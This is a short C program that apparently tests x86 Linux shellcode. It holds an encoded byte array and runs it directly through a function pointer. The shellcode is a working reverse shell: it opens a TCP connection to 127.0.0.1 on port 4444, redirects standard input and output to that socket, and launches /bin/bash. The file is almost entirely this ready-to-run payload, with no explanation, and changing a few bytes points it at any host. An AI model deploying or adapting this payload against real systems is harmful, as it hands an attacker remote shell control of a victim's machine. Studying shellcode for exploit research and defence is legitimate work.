#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x89\xc3\x89\xc1\x89\xc2\x66\xb8\x67\x01\xb3\x02\xfe\xc1\xcd\x80\x89\xc3\x31\xc0\x89\xc2\x66\xb8\x6a\x01\x31\xc9\x51\xb9\x80\xff\xff\xfe\x83\xf1\xff\x51\x66\x68\x11\x5C\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x31\xc0\xb0\x3f\xcd\x80\x49\x31\xc0\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
